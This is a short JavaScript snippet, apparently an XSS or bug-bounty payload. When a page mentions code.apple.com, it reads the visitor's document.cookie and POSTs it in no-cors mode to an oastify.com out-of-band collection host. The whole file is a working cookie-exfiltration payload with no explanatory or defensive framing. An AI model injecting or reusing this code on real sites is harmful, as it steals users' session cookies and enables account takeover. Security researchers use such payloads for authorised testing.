var reg=/code\.apple.com/ig;
if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
fetch('https://d0erjq7cxyx9639j9ndmonmk8be22r.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
}
